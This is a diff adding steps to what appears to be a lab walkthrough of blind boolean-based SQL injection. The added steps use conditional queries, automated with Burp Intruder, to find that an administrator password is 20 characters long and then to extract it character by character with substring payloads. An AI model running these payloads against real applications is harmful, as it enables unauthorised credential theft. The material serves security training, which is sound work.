@@ -16,3 +16,19 @@ Confirming that the password is greater than 1 character in length.
 ' and (select 'a' from users where username='administrator' and length(password)>1)='a
 
 Repeat this step with incrementing the value from 1 to 19. Use burp intruder to automate this.
+We come to know that the welcome message disappeared at 20. So , the password length is 20.
+' and (select 'a' from users where username='administrator' and length(password)>19)='a
+
+Using the substring method to guess the characters of  password. Use burp intruder.
+' and (select substring(password,1,1) from users where username ='administrator')='§a§
+
+The first letter is 1
+
+Change the starting point to 2
+' and (select substring(password,2,1) from users where username ='administrator')='§a§
+
+The secont character is c
+1cs
+
+
+
